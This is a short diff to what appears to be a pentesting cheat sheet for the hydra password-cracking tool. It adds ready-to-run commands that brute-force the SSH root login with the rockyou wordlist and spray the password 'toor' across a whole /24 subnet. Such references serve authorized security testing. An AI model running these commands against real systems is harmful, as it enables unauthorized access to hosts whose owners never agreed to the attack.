@@ -13,9 +13,17 @@
 
 ### SSH
 
+#### Bruteforcing user on a single host
+
 ```
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -e nsr ssh
+```
+
+#### Spraying across a network
+
+```
+hydra -l root -p toor 10.0.0.0/24 ssh
 ```
 
 ### HTTP POST
